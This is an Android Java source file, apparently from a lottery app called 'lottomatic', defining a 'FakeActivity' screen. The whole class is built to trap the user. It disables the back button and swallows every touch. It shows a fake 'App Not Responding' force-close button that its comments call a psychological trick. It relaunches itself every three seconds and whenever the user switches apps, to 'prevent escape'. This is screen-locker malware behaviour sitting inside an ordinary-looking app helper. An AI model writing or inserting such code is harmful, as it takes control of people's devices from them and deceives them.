package com.example.lottomatic.helper;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.activity.OnBackPressedCallback;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.example.lottomatic.LoginActivity;
import com.example.lottomatic.R;
import com.example.lottomatic.helper.ConSQL;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

public class FakeActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fake_screen);

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                // Ignore back button
            }
        });

        // ===== 2. BLOCK ALL TOUCH EVENTS =====
        View rootView = findViewById(android.R.id.content);
        rootView.setOnTouchListener((v, event) -> true); // Consume all touches

        // ===== 3. FAKE "FORCE CLOSE" BUTTON (PSYCHOLOGICAL TRICK) =====
        Button fakeCloseButton = findViewById(R.id.btn_fake_close);
        fakeCloseButton.setOnClickListener(v -> {
            // Show a fake "crashing" message
            fakeCloseButton.setText("App Not Responding. Please wait...");
        });

        // ===== 4. RESTART LOOP EVERY 3 SECONDS (PREVENT ESCAPE) =====
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, FakeActivity.class));
            finish();
        }, 3000);
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Immediately restart if user tries to switch apps
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, FakeActivity.class));
        }, 100);
    }
}